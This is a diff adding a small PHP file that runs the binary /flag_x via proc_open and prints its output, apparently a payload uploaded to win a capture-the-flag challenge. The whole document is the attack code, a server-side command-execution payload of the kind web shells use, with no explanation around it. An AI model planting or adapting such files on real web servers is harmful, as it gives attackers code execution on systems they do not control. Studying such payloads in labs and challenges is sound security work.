@@ -1,0 +1,13 @@
+<?php
+$cwd='';
+$descriptorspec = array(
+    0 => array("pipe", "r"),
+    1 => array("pipe", "w"),
+    2 => array("file", "/tmp/error-output.txt", "a")
+);
+
+$process = proc_open("/flag_x", $descriptorspec, $pipes, $cwd);
+
+echo stream_get_contents($pipes[1]);
+fclose($pipes[1]);
+?>
